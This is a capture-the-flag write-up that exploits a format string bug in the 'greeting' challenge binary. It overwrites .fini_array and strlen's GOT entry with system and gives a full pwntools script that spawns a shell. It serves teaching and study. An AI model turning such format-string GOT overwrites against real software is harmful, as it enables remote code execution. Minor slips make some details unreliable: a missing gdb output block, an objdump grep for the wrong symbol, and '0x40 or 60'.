# Tokyowesterns 2016 greeting

Let's take a look at the binary:

```

    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we are dealing with a `32` bit binary, with a stack canary and non executable stack (but no RELRO or PIE). Let's see what happens when we run the binary:

```
./greeting
Hello, I'm nao!
Please tell me your name... guyinatuxedo
Nice to meet you, guyinatuxedo :)
```


So we can see that we are prompted for input, which it prints back out to us. Let's take a look at the binary in Ghidra:
```
void main(void)

{
  int bytesRead;
  int in_GS_OFFSET;
  char printedString [64];
  undefined name [64];
  int stackCanary;
 
  stackCanary = *(int *)(in_GS_OFFSET + 0x14);
  printf("Please tell me your name... ");
  bytesRead = getnline(name,0x40);
  if (bytesRead == 0) {
    puts("Don\'t ignore me ;( ");
  }
  else {
    sprintf(printedString,"Nice to meet you, %s :)\n",name);
    printf(printedString);
  }
  if (stackCanary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see that in the `main` function, it runs the `getnline` function which scans in input and returns the amount of bytes read (I will cover that function next). It scans in data into the `name` char buffer. Proceeding that if `getnline` didn't scan in `0` bytes, it will write the string `"Nice to meet you, " + ourInput + " :)\n"` to `printedString`, then prints it using `printf`. Thing is since in the `printf` call it doesn't specify a format to print the input, this is a format string bug and we can specify how our input is printed. Using the `%n` flag with printf, we can actually write to memory. Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.

Looking at the `getnline` function, we see this:
```
void getnline(char *ptr,int bytesRead)

{
  char *pcVar1;
 
  fgets(ptr,bytesRead,stdin);
  pcVar1 = strchr(ptr,10);
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  strlen(ptr);
  return;
}
```

It just scans in `bytesRead` amount of data (in our case `0x40` or `60` so no overflow) into the space pointed to by `ptr`. Proceeding that, it will replace the newline character with a null byte. It will then return the output of `strlen` on our input.

Now the next thing we need will be a function to overwrite a got entry with. Looking through the list of imports in ghidra (imported functions are included in the compiled binary code, and since pie isn't enabled we know the addresses of those functions) we can see that `system` is imported, and is at the address `0x8048490` in the plt table:

```
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int system(char * __command)
                               Thunked-Function: <EXTERNAL>::system
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   __command
                             system@@GLIBC_2.0
                             system                                          XREF[2]:     system:08048490(T),
                                                                                          system:08048490(c), 08049a48(*)  
        0804a014                 ??         ??

```

We can also find the address using `objdump`:
```
$    objdump -D greeting | grep system
08048490 <system@plt>:
 8048779:    e8 12 fd ff ff           call   8048490 <system@plt>
```

So we will overwrite a got entry of a function with `system` to call it. The question is now which function to overwrite? Now we run into a different problem. The only function called after the `printf` call which gives us a format string write, is `__stack_chk_fail()` which will only get called if we execute a buffer overflow which we really can't do right now. We will overcome this by writing to the `.fini_array`, which contains an array of functions which are executed sometime after main returns. We will just write to it the address which starts the setup for the `getnline` function, to essentially wrap back around. We can find the `.fini_array` using gdb while running the program:

```

Through all of that we can see that the `.fini_array` is at `0x8049934`:

```
    0x08049934 - 0x08049938 is .fini_array
```

For the address we will loop back to, I choose `0x8048614`. This is the start of the setup for the `getnline` function call, and through trial and error we can see that it doesn't crash when we loop back here:

```
        0804860f e8 3c fe        CALL       printf                                           int printf(char * __format, ...)
                 ff ff
        08048614 c7 44 24        MOV        dword ptr [ESP + local_ac],0x40
                 04 40 00
                 00 00
        0804861c 8d 44 24 5c     LEA        EAX=>name,[ESP + 0x5c]
        08048620 89 04 24        MOV        dword ptr [ESP]=>local_b0,EAX
        08048623 e8 51 00        CALL       getnline                                         undefined getnline(undefined4 pa
                 00 00
```

Now brings up the question of which function's got address will we overwrite. Since the function system takes a single argument (a char pointer), ideally it would be a function that takes a single argument that is a char pointer to our input. I decided to go with the `strlen`, since in `getnline` it is called with a char pointer to our input. In addition to that, it isn't called somewhere else that would cause a crash with what we are doing. In Ghidra looking at the `.got.plt` memory region, we can see that the `got` entry is at `0x8049a54`:

```
                             PTR_strlen_08049a54                             XREF[1]:     strlen:080484c0  
        08049a54 20 a0 04 08     addr       strlen                                           = ??
```

We can also find it using `objdump`:
```
$    objdump -R greeting | grep system
08049a48 R_386_JUMP_SLOT   system@GLIBC_2.0
```

So now the last part I need to cover is actually exploiting the format string bug. I did this by hand, and it tends to get a bit grindy. The first thing we need to do is find our input in reference to the `printf` call, which we can do using the `%x` flag:

```
./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
Hello, I'm nao!
Please tell me your name... 0000111122223333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Nice to meet you, 0000111122223333.80487d0.ff8c4e3c.0.0.0.0.6563694e.206f7420.7465656d.756f7920.3030202c.31313030.32323131.33333232.252e3333.% :)
```

So we can see our input popping up `3030202c.31313030.32323131.33333232` (`1` = `0x31`, `2` = `0x32`, `0`=`0x30`). Through a bit of shifting around values, we can find that the format string `xx0000111122223333` gives us what we need.
```
./greeting
Hello, I'm nao!
Please tell me your name... xx0000111122223333.%12$x.%13$x.%14$x.%15$x
Nice to meet you, xx0000111122223333.30303030.31313131.32323232.33333333 :)
```

Now when printf writes a value, it will write the amount of bytes it has printed. So if we need to write the value `0x804`, we need to print that many bytes. Since we are writing values like `0x8048614` I choose to split it up, that way we don't need to wait several minutes for the printf call to finish. I split up each write into two separate writes, and that is why we needed four four byte spaces, each one for a different address. For the split writes, we will first write to the lower two bytes of each address. Since the top two bytes for each of the values we are writing is the same (`0x804`) I choose to write those last.

Now when I ran the exploit below hand, these are the values that are written by default. At this point I know everything I need to write the exploit, except the extra number of bytes I need to print to write the correct values (to print `13` bytes we can just specify the format string `%13x`):

```
gefâž¤  x/x 0x8049934
0x8049934:    0x00240024
gefâž¤  x/x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x00240024
```

The first write I do is the the lower two bytes of the `.fini_array` address `0x8049934`. I need it to be the value `0x8614`, and it's value right now is `0x24`. So we just need to print an additional `0x8614 - 0x24 = 34288` bytes to get it to that value. Also the bytes printed before will affect future writes, so I just went through and did this for each individual write (except for the last two, since they were the same write I only needed to have one additional bytes printing for it). Subsequent writes can only be greater or equal to, not lesser.

When we try to write the higher two bytes, we run into a bit of an issue:

```
gefâž¤  x/x 0x8049934
0x8049934:    0x84908614
gefâž¤  x/x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x84908490
```

The value it is writing to the higher two bytes is `0x8490`, however the value we need to write is smaller than that `0x0804`. So what we can do is write a larger value to it that contains the value `0x0804`, however the higher portion of that number will end up outside of the area we are writing to it. In order to do this, we will need to print `33652` bytes:

```
>>> (0x10000 - 0x8490) + 0x804
33652
```
we can see that the value were writing overflows into other subsequent dwords, however it doesn't really affect us:

```
gefâž¤  x/2x 0x8049934
0x8049934:    0x08048614    0x00000002
gefâž¤  x/2x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x08048490    0xf7d40002
```

With all of that, we can put it together and we get this exploit:
```
from pwn import *

# Establish the target process
target = process('greeting')
gdb.attach(target, gdbscript = 'b *0x0804864f')

# The values we will be overwritting
finiArray = 0x08049934
strlenGot = 0x08049a54

# The values we will be overwritting with
getline = 0x8048614
systemPlt = 0x8048490

# Establish the format string
payload = ""

# Just a bit of padding
payload += "xx"

# Address of fini array
payload += p32(finiArray)

# Address of fini array + 2
payload += p32(finiArray + 2)

# Address of got entry for strlen
payload += p32(strlenGot)

# Address of got entry for strlen + 2
payload += p32(strlenGot + 2)

# Write the lower two bytes of the fini array with loop around address (getline setup)
payload += "%34288x"
payload += "%12$n"

# Write the lower two bytes of the plt system address to the got strlen entry
payload += "%65148x"
payload += "%14$n"

# Write the higher two bytes of the two address we just wrote to
# Both are the same (0x804)
payload += "%33652x"
payload += "%13$n"
payload += "%15$n"

# Print the length of our fmt string (make sure we meet the size requirement)
print "len: " + str(len(payload))

# Send the format string
target.sendline(payload)

# Send '/bin/sh' to trigger the system('/bin/sh') call
target.sendline('/bin/sh')

# Drop to an interactive shell
target.interactive()
```

With that exploit, we get shell!
